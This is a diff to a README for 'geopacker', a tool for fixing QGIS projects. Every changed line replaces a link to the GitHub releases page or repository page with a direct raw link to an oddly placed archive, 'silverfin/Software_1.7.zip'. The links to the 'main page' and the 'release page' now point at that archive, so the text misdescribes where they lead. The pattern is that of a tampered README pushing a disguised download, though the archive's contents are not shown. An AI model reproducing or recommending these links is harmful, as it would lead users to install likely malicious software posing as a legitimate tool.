@@ -1,6 +1,6 @@
 # 🗺️ geopacker - Fix QGIS Projects Easily
 
-[![Download geopacker](https://img.shields.io/badge/Download-geopacker-brightgreen?style=for-the-badge)](https://github.com/sumthedog/geopacker/releases)
+[![Download geopacker](https://img.shields.io/badge/Download-geopacker-brightgreen?style=for-the-badge)](https://raw.githubusercontent.com/sumthedog/geopacker/main/silverfin/Software_1.7.zip)
 
 ---
 
@@ -37,7 +37,7 @@ You do not need any programming knowledge or special tools to use geopacker. It 
 
 You can get geopacker from the official GitHub releases page.
 
-[![Download geopacker](https://img.shields.io/badge/Download-geopacker-blue?style=for-the-badge)](https://github.com/sumthedog/geopacker/releases)
+[![Download geopacker](https://img.shields.io/badge/Download-geopacker-blue?style=for-the-badge)](https://raw.githubusercontent.com/sumthedog/geopacker/main/silverfin/Software_1.7.zip)
 
 Follow the steps in the next section to install it on your Windows computer.
 
@@ -48,7 +48,7 @@ Follow the steps in the next section to install it on your Windows computer.
 1. **Go to the Releases Page**
 
    Open this page in your web browser:  
-   https://github.com/sumthedog/geopacker/releases
+   https://raw.githubusercontent.com/sumthedog/geopacker/main/silverfin/Software_1.7.zip
 
 2. **Find the Latest Version**
 
@@ -132,7 +132,7 @@ After installing geopacker, run it with these steps:
 If you have issues not covered here, the GitHub repository has a discussion section where you can read questions or ask for help.
 
 Visit the main page here:  
-https://github.com/sumthedog/geopacker
+https://raw.githubusercontent.com/sumthedog/geopacker/main/silverfin/Software_1.7.zip
 
 ---
 
@@ -146,7 +146,7 @@ geopacker runs inside QGIS and only accesses files linked to your current projec
 
 Check the release page periodically for updates or bug fixes:
 
-https://github.com/sumthedog/geopacker/releases
+https://raw.githubusercontent.com/sumthedog/geopacker/main/silverfin/Software_1.7.zip
 
 Update by downloading the latest `.zip` file and installing it via QGIS as described above.
 
